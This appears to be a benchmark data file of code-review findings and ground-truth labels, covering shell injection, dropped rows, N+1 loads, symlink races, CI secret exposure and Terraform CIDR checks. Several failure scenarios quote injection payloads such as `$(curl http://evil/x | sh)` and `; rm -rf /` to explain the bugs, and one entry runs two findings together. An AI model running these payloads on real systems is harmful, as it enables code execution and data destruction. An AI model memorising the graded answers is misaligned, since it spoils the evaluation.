findings.body: Building the command as a shell string and passing it to execSync lets userName inject shell metacharacters. A caller-controlled userName can execute arbitrary commands with the process's privileges. Add `import { execFileSync } from "node:child_process";` and remove the `command` variable.
findings.failure_scenario: A caller passes userName such as `$(rm -rf /)` or `; touch /tmp/pwned`; execSync runs the string through /bin/sh, executing the injected command.
findings.title: Use execFileSync to avoid shell injection

findings.body: `rows.slice(1)` drops the first row, contradicting the spec requirement 'Rendering shall preserve every input row in order.' The previous implementation returned `rows` unchanged.
findings.failure_scenario: Calling renderReport("alice", ["first", "second"]) returns ["second"] instead of ["first", "second"], so the report silently loses the first row and any downstream consumer sees incomplete data.
findings.title: Return rows unchanged to preserve every input row

findings.body: Building a shell command by interpolating userName and passing it to execSync invokes the system shell, which the spec forbids ('Report commands shall avoid shell interpretation'). A userName containing shell metacharacters (e.g. `; rm -rf ~`) is executed as part of the command.
findings.failure_scenario: A user name such as `alice; rm -rf /tmp/report` is interpolated into the command string; execSync runs it through the shell, executing the injected command and causing arbitrary command execution.
findings.title: Use execFileSync with an argument array to avoid shell interpretation

findings.body: The previous implementation used repo.loadMany(ids) to fetch all items in a single batch. This change loops over ids and calls repo.load(id) once per iteration, which results in an N+1 query pattern. The number of database round-trips scales linearly with the size of ids, causing significant latency and resource consumption.
findings.failure_scenario: When ids contains many entries, enrich issues a separate database query for each id. This increases latency, can exhaust the connection pool, and degrades performance compared to the previous batched load.
findings.title: Batch the repo lookups to avoid N+1

findings.body: `std::mem::uninitialized` is deprecated and creates a value without initializing its fields. findings.body: The containment check is performed on the canonicalized path, but File::open re-resolves the path by name and follows symlinks. Between canonicalize and File::open, candidate (or a parent directory component) can be replaced with a symlink pointing outside root, so the prefix check can be bypassed.

findings.title: Use a race-free open after the containment check

findings.body: Building a shell command by string interpolation and executing it with `sh -c` lets `user` inject shell metacharacters. Use `Process.run` with an argument list so the value is passed as a single argument without shell interpretation. Remove the preceding `final command = ...` line.

findings.failure_scenario: If `user` is `alice; rm -rf /`, the shell executes `report --user alice` and then `rm -rf /`, causing arbitrary command execution.
findings.title: Avoid shell interpolation of user input

findings.body: The rewrite replaces one bulk `repository.loadMany(ids)` with an explicit `for` loop that awaits `repository.load(id)` once per entry, with no bound on `ids`. When callers can control this list, a huge input triggers a sequential burst of repository calls and grows `results`, enabling service exhaustion. If there is no upstream size limit (not visible here), add one before the loop.
findings.failure_scenario: An attacker passes a list with a very large number of IDs. `enrich` issues that many sequential awaited repository loads, consuming connections/CPU/memory until requests time out or the service degrades.
findings.title: Cap the number of IDs loaded to prevent N+1 resource exhaustion

findings.body: The previous implementation used repository.loadMany(ids) to fetch all items in one call. The new loop calls repository.load(id) once per id, turning a single batch operation into N individual round-trips.
findings.failure_scenario: When ids contains many entries, enrich issues one repository call per id, multiplying latency and potentially exhausting connection pools or rate limits.
findings.title: Batch the repository loads

findings.body: ResultListFactory has a single caller and only returns an empty list; it adds indirection without value. Replace the call with a list literal and delete the class.
findings.title: Use a list literal instead of ResultListFactory

findings.title: Return all rows instead of dropping the first

findings.body: The original implementation used repository.loadMany(ids) to fetch all items in a single call. Replacing it with a per-id load inside a loop introduces an N+1 query pattern, causing one database round-trip per id. This is a performance regression that directly contradicts the stated intent of an efficiency design.
findings.failure_scenario: When enrich is called with a list of many ids, the loop issues one query per id, leading to hundreds or thousands of round-trips. This can cause slow response times, timeouts, or resource exhaustion, breaking the application under load.
findings.title: Replace per-item load with batch loadMany to preserve efficiency

findings.body: The user value is concatenated directly into a shell command executed with sh -c, allowing arbitrary command execution if user is attacker-controlled. Use exec.Command with separate arguments so the value is passed as a single argument without shell interpretation.
findings.failure_scenario: An attacker supplies a user value such as "alice; rm -rf /" and the shell executes the injected command alongside the intended report command.
findings.title: OS command injection via user input in shell command

findings.body: `rows[1:]` drops the first row and panics when `rows` is nil or empty. The previous implementation returned the slice unchanged, and the commit message says report rows are preserved.
findings.failure_scenario: When `Render` is called with an empty or nil `rows` slice, `rows[1:]` panics with a slice bounds out of range error; when called with one row, it returns an empty slice and the row is lost.
findings.title: Return rows, not rows[1:], to preserve rows

findings.body: Building a shell command from user_name and running it with shell=True allows command injection if user_name contains shell metacharacters. The original list-argument form passed the value as a single argv element without invoking a shell. Remove the preceding `command = ...` line and use the list form.
findings.failure_scenario: A caller passes user_name = "alice; rm -rf /" (or any shell metacharacters); the shell executes the injected command in addition to report, causing arbitrary command execution.
findings.title: Avoid shell=True with interpolated user input

findings.body: `rows[1:]` discards the first row, contradicting the spec requirement that rendering preserve every input row in order. The previous implementation returned `rows` unchanged.
findings.failure_scenario: `render_report("alice", ["first", "second"])` returns `["second"]`, so the report omits the first row and downstream consumers receive incomplete data.
findings.title: Preserve every input row instead of dropping the first

findings.body: The assertion only checks that the result is not None, so a regression that returns an empty list, a different slice, or raises would pass as long as it returns something. The changed code now drops the first row; the test should pin that behavior.
findings.title: Strengthen test to assert the row-dropping behavior

findings.body: Using PurePath(user_id).name to normalize a user ID is a path-traversal mitigation that does not belong in a database query. It silently transforms IDs containing path separators or dots (e.g. '../admin' becomes 'admin', 'a/b' becomes 'b') and can cause the query to target a different user than intended. If the intent is to sanitize input, validate the ID format explicitly instead of reinterpreting it as a path.
findings.failure_scenario: A caller passes a user ID such as '../admin' or 'a/b'; PurePath(...).name collapses it to 'admin' or 'b', so the query returns a different user's record than the caller requested, enabling an IDOR-style access to another account.
findings.title: Path traversal via PurePath normalization of user ID

findings.body: execSync with a string command runs through a shell, violating the spec's requirement that report commands avoid shell interpretation. It also enables command injection if userName contains shell metacharacters.
findings.failure_scenario: If userName is `alice; rm -rf /`, execSync executes `report --user alice; rm -rf /` in a shell, running arbitrary commands on the host.
findings.title: Use execFileSync/spawnSync to avoid shell interpretation

findings.body: Interpolating userName into a shell string and running it with execSync lets the value be parsed by the shell. A name containing spaces is split into multiple arguments, and shell metacharacters (e.g. `;`, `$()`, backticks) execute arbitrary commands. Pass the user name as a separate argument to execFileSync (or spawnSync) so no shell parsing occurs.
findings.failure_scenario: If userName is attacker-controlled, a value such as `$(curl http://evil/x | sh)` or `; rm -rf ~` is executed with the process's privileges, leading to arbitrary code execution.
findings.title: Use execFileSync with an argument array to prevent shell injection

findings.body: `toBeTruthy()` passes for any array — including an empty one — so this assertion cannot catch a wrong return value. The previous exact equality enforced the contract and would have caught the new `rows.slice(1)` behavior silently returning a subset.
findings.title: Assert the exact returned rows, not just truthiness

findings.body: Interpolating `userName` into a shell string and passing it to `execSync` runs untrusted input through the system shell. Shell metacharacters in `userName` are interpreted as shell syntax, so the command line built on the previous line is a command-injection vector. Update line 1 to import `execFileSync` instead of `execSync`, and remove the now-unused `command` line.
findings.failure_scenario: When `userName` is `$(touch /tmp/pwn)` or `; rm -rf $HOME`, `execSync` spawns a shell and executes the injected command with the Node process's privileges.
findings.title: Use execFileSync with an argument array, not execSync

findings.body: `rows.slice(1)` removes the first element, so renderReport no longer returns all rows. The spec requires rendering to preserve every input row.
findings.failure_scenario: renderReport("alice", ["first", "second"]) returns ["second"], silently dropping "first"; any consumer expecting the full row set loses data.
findings.title: Preserve every input row; do not slice off the first row

findings.body: The format! macro interpolates the user-controlled `user` string directly into a shell command string that is then executed via `sh -c`. This allows an attacker to inject arbitrary shell commands through metacharacters such as `;`, `&&`, or `$()`.
findings.failure_scenario: An attacker supplies a username like `; rm -rf / #` or `$(curl http://attacker/malware | sh)`, causing the shell to execute additional commands beyond the intended `report --user`, leading to arbitrary code execution as the process user.
findings.title: Avoid shell command injection by not using sh -c

findings.body: Constructing a shell command string from the user-controlled `user` value and running it through `sh -c` lets shell metacharacters in `user` execute arbitrary commands. This also contradicts the specification requirement to pass user names as arguments without a shell. Use `Command::new("report").args(["--user", user])` directly.
findings.failure_scenario: A caller passes a value like `alice; rm -rf $HOME` as `user`. The constructed command becomes `report --user alice; rm -rf $HOME`, which `sh -c` runs as two commands, so arbitrary code executes with the application's privileges.
findings.title: Execute report without shell to avoid command injection

findings.body: The containment check on `candidate` is performed after `canonicalize`, but `File::open` resolves the pathname from scratch. A concurrent process that can write to a directory under `root` can replace a checked component with a symlink to an outside path between the canonicalize/strip_prefix check and the open syscall. The prefix check therefore does not provide durable containment.
findings.failure_scenario: An attacker who can modify a subdirectory under `root` waits until `canonicalize` has verified the path, then renames that subdirectory and replaces it with a symlink to `/etc`; the subsequent `File::open(candidate)` follows the symlink and opens an arbitrary file outside `root`.
findings.title: Open from a pinned dirfd to avoid a symlink TOCTOU

findings.body: The commit message says the refactor keeps callers compatible, but this signature removes the timeoutMs default and changes the return type from Map<String, Object?> to a record. Existing calls with one argument fail, and code expecting a Map result breaks.
findings.failure_scenario: A caller invoking fetchUser('42') now receives an argument error because timeoutMs is required; a caller doing result['id'] on the previous Map now gets a record and fails at compile or runtime.
findings.title: Restore optional timeoutMs and Map return to keep callers compatible

findings.body: The old implementation returned fetchedAt = DateTime.now().toUtc(), and the removed comment called this a stable map contract. The new record drops fetchedAt and substitutes window.location.origin, so callers relying on the timestamp now lose it.
findings.failure_scenario: A caller that reads the previous result's fetchedAt key now gets a missing value or an incompatible record type, causing incorrect timestamps or a runtime type error downstream.
findings.title: Return fetchedAt to preserve the stable result contract

findings.body: return rows[1:] drops the first row, so rendering does not preserve every row as the specification requires. It also panics with a slice bounds error when rows is empty.
findings.failure_scenario: Render is called with rows ["first","second"]; it returns ["second"], silently dropping the first row, and with an empty slice it panics with a slice bounds error.
findings.title: Return all rows instead of dropping the first element

findings.body: Treating a database key as a filesystem path changes the lookup semantics. `PurePath(user_id).name` strips directory-like prefixes and resolves `.`/`..`, so `'team/42'` and `'42'` both query id `'42'`, while `'.'` or `'/'` collapse to an empty string. On Windows vs POSIX `PurePath` also behaves differently, so the same ID normalizes differently depending on host OS. User IDs are opaque keys; the existing parameterized query already prevents injection, so this path normalization should be removed.
findings.failure_scenario: If `find_user` is called with `user_id='team/42'` and a user with id `42` exists, `normalized_id` becomes `42`, and the query returns user 42 instead of no row, so a caller may operate on or authorize the wrong record.
findings.title: Query by the original user_id, not a path-normalized value

ground_truth.clean_trap: User input still reaches a query, but the statement remains parameterized and path-like prefixes are discarded.

findings.body: The change builds a shell command with `format!` and runs it via `sh -c`, so a user value containing shell metacharacters (for example `; rm -rf ~`) executes arbitrary commands. It also contradicts the spec requirement to pass user names as arguments without a shell.
findings.failure_scenario: A caller passes a user name such as `alice; rm -rf ~`; the shell executes the injected command in addition to `report`, causing arbitrary command execution.
findings.title: Use argument vector instead of shell to pass user name

findings.body: Interpolating user into a shell command and running it with sh -c allows shell metacharacters in user to execute arbitrary commands. The previous code passed user as a separate argv element, which does not invoke a shell.
findings.failure_scenario: If user is `alice; rm -rf /`, sh -c runs `report --user alice` and then `rm -rf /`, executing arbitrary commands with the process's privileges.
findings.title: Pass user as a direct argument, not through sh -c

findings.body: skip(1) discards the first row, so render_report no longer preserves the rows it is given. This contradicts the stated intent and changes the function's contract.
findings.failure_scenario: Calling render_report with rows ["first", "second"] returns ["second"], silently dropping the first row and breaking callers that expect all rows.
findings.title: Return all rows instead of skipping the first

findings.body: The test was changed from asserting exact rows to only checking non-empty. It no longer verifies the new skip(1) behavior, so a regression that drops too many rows or returns the wrong rows would pass.
findings.title: Strengthen test to assert exact rows after skip(1)

findings.body: The change replaces a single `repository.loadMany(ids)` call with one `repository.load(id)` per id inside the loop. Each iteration issues its own I/O round-trip, so latency and load scale linearly with the number of ids.
findings.failure_scenario: When `ids` contains many entries, the function performs one database/network request per id instead of one batched request, increasing total latency and potentially exhausting connections or rate limits.
findings.title: Batch the per-id loads

findings.body: The previous implementation used repository.loadMany(ids) for a single bulk load. This change replaces it with a per-id await repository.load(id) loop. For a database- or network-backed repository this creates an N+1 access pattern and can be substantially slower, contradicting the efficiency intent in the commit message.
findings.failure_scenario: When enrich receives a large ids list, it now issues one load call per id rather than one loadMany call; latency grows linearly and a remote repository may exhaust connection limits or time out.
findings.suggestion:
final loaded = await repository.loadMany(ids);
  results.addAll(loaded.where((item) => item.active && item.owner != null && item.owner!.enabled));
findings.title: Use repository.loadMany to avoid N+1 loads

findings.body: Changing `timeoutMs` from an optional parameter with a default of 30000 to a required positional parameter breaks every existing caller that invokes `fetchUser(id)` or relies on the default. The return type also changed from `Map<String, Object?>` to a record, so callers expecting a map will break. This contradicts the stated intent to keep callers compatible.
findings.failure_scenario: A caller that previously called `fetchUser('123')` now fails to compile because the required argument `timeoutMs` is missing, and any caller assigning the result to a `Map` variable gets a type error.
findings.title: Restore original signature and return type to keep callers compatible

findings.title: Restore original map contents to keep callers compatible

findings.body: The method returns the ResultSet but never closes the PreparedStatement. If the caller closes only the ResultSet (the common pattern), the statement remains open on the connection until the connection itself is closed, leaking database cursors under repeated calls. Use Statement.closeOnCompletion() so the statement is released when the result set is closed.

findings.title: Close the PreparedStatement when the ResultSet is closed

findings.body: The switch from `pull_request` to `pull_request_target` causes the workflow to run with the base repository's permissions (including secrets and write access) for pull requests from forks. The `actions/checkout@v4` step defaults to checking out the merge commit of the PR, which includes untrusted code from the fork. While the current `labeler` action does not execute that code, future steps or vulnerabilities in the action could be exploited to exfiltrate secrets or modify the repository. Use `ref: ${{ github.base_ref }}` in the checkout step to check out the base branch instead.
findings.failure_scenario: A malicious fork PR modifies `.github/labeler.yml` to exploit a vulnerability in the `labeler` action or includes a script that is later executed by an added step, leading to secret exfiltration or unauthorized repository modifications.
findings.title: Use base ref for checkout with pull_request_target

findings.body: The `actions/labeler` action is pinned to a mutable major version tag (`v6`). If the action's repository or owner account is compromised, an attacker could publish a malicious version under the same tag, which would then be used by this workflow with write access to pull requests. Pin the action to a full-length commit SHA to ensure immutability.
findings.failure_scenario: An attacker gains control of the `actions/labeler` repository and pushes a malicious commit to the `v6` tag. The next workflow run uses the compromised action and could steal secrets or modify pull requests.
findings.title: Pin actions/labeler to a commit SHA

findings.failure_scenario: An operator sets admin_cidr to 0.0.0.0/1, which includes half of all IPv4 addresses; the validation passes because it only checks for 0.0.0.0/0, and the security group opens SSH (port 22) to that broad range, exposing the instance to internet-wide brute-force attacks.
findings.title: Strengthen admin_cidr validation to block all public ranges

findings.body: The new public input variable has no description, so users cannot tell what CIDR format is expected or why the restriction exists.
findings.suggestion:
variable "admin_cidr" {
  description = "CIDR block allowed to access admin SSH (must not be 0.0.0.0/0)."
findings.title: Add a description to the admin_cidr variable

ground_truth.clean_trap: The ingress CIDR became configurable, but its safe default and validation explicitly reject public admin access.
ground_truth.name: terraform-clean-context-v1
